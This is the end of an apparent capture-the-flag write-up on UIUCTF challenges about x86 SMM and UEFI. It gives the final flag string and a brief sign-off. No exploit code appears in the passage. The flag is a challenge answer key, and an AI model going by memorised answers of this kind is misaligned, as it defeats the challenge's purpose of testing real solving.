entire flag: <code>uiuctf{uefi_is_hard_and_vendors_dont_care_1403c057}</code>. GG!</p>
<hr>
<p>GG to you too if you made it this far :O. All in all, this was very fun and
interesting set of challenges that made me learn a lot about x86 SMM and UEFI.
Hope you enjoyed the write-up.</p>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
&copy; 2024 Tower of Hanoi. All rights reserved.
<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://twitter.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Haoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-sz7xmlte> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-sz7xmlte></path> </svg> </a> </div> </footer>  </body></html>